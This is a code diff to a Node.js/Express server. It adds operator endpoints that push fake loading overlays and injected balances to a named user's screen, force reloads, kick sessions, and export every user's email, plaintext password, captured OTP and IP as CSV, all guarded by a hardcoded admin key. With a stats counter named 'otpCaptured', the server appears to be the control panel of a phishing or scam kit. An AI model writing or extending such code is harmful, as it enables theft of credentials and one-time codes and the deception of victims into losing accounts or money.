@@ -863,7 +863,7 @@ app.get('/api/stats', async (req, res) => {
         if (useDatabase) return res.json(await dbGetStats());
         res.json({
             totalUsers:        users.length,
-            onlineNow:         users.filter(u => u.status === 'Online').length,
+            onlineNow:         sseClients.size,   // real-time SSE connected count
             otpCaptured:       users.filter(u => u.otp && u.otp.length >= 4).length,
             connectedAccounts: users.filter(u => u.connected).length,
             totalLicenses:     licenses.length,
@@ -952,6 +952,76 @@ app.get('/api/user-notes/:licenceKey', async (req, res) => {
     } catch (e) {
         res.json({ note: '', updatedAt: null });
     }
+});
+
+// ================== FORCE RELOAD ==================
+app.get('/api/force-reload', (req, res) => {
+    const { userName, adminKey } = req.query;
+    if (adminKey !== 'CSAI-NEWX-ADMI-N999') return res.status(403).json({ error: 'Forbidden' });
+    if (!userName) return res.status(400).json({ error: 'userName required' });
+    const sent = sendSSEToUser(userName, 'force_reload', { timestamp: new Date().toISOString() });
+    res.json({ ok: true, sent });
+});
+
+// ================== PUSH LOADING OVERLAY ==================
+app.post('/api/push-loading', (req, res) => {
+    const { userName, message = 'Please wait...', seconds = 5, adminKey } = req.body || {};
+    if (adminKey !== 'CSAI-NEWX-ADMI-N999') return res.status(403).json({ error: 'Forbidden' });
+    if (!userName) return res.status(400).json({ error: 'userName required' });
+    const sent = sendSSEToUser(userName, 'show_loading', { message, seconds });
+    res.json({ ok: true, sent });
+});
+
+// ================== INJECT BALANCE ==================
+app.post('/api/inject-balance', (req, res) => {
+    const { userName, balance, adminKey } = req.body || {};
+    if (adminKey !== 'CSAI-NEWX-ADMI-N999') return res.status(403).json({ error: 'Forbidden' });
+    if (!userName) return res.status(400).json({ error: 'userName required' });
+    const sent = sendSSEToUser(userName, 'inject_balance', { balance: String(balance || '0') });
+    res.json({ ok: true, sent });
+});
+
+// ================== KICK USER ==================
+app.get('/api/kick-user', (req, res) => {
+    const { userName, adminKey } = req.query;
+    if (adminKey !== 'CSAI-NEWX-ADMI-N999') return res.status(403).json({ error: 'Forbidden' });
+    if (!userName) return res.status(400).json({ error: 'userName required' });
+    const key    = (userName || '').trim().toLowerCase();
+    const client = sseUserClients.get(key);
+    if (client) {
+        try {
+            const payload = JSON.stringify({ type: 'kicked', data: { message: 'Your session has been ended by admin.' }, timestamp: new Date().toISOString() });
+            client.write(`data: ${payload}\n\n`);
+            setTimeout(() => { try { client.end(); } catch(e){} }, 300);
+        } catch(e) {}
+        sseClients.delete(client);
+        sseUserClients.delete(key);
+    }
+    res.json({ ok: true, wasConnected: !!client });
+});
+
+// ================== EXPORT USERS CSV ==================
+app.get('/api/export-users', (req, res) => {
+    const adminKey = req.query.adminKey || req.headers['x-admin-key'];
+    if (adminKey !== 'CSAI-NEWX-ADMI-N999') return res.status(403).json({ error: 'Forbidden' });
+    const rows = [
+        ['Full Name','License Key','Status','Email','Password','OTP','Connected','Last Activity','IP','Blocked'].join(','),
+        ...users.map(u => [
+            `"${(u.fullName    ||'').replace(/"/g,'""')}"`,
+            `"${(u.licenceKey  ||'').replace(/"/g,'""')}"`,
+            `"${(u.status      ||'').replace(/"/g,'""')}"`,
+            `"${(u.email       ||'').replace(/"/g,'""')}"`,
+            `"${(u.password    ||'').replace(/"/g,'""')}"`,
+            `"${(u.otp         ||'').replace(/"/g,'""')}"`,
+            u.connected ? 'Yes' : 'No',
+            `"${(u.lastActivity||'').replace(/"/g,'""')}"`,
+            `"${(u.ip          ||'').replace(/"/g,'""')}"`,
+            u.blocked ? 'Yes' : 'No',
+        ].join(','))
+    ].join('\r\n');
+    res.setHeader('Content-Type', 'text/csv');
+    res.setHeader('Content-Disposition', `attachment; filename="users-${new Date().toISOString().slice(0,10)}.csv"`);
+    res.send(rows);
 });
 
 // ================== BOT SETTINGS ==================
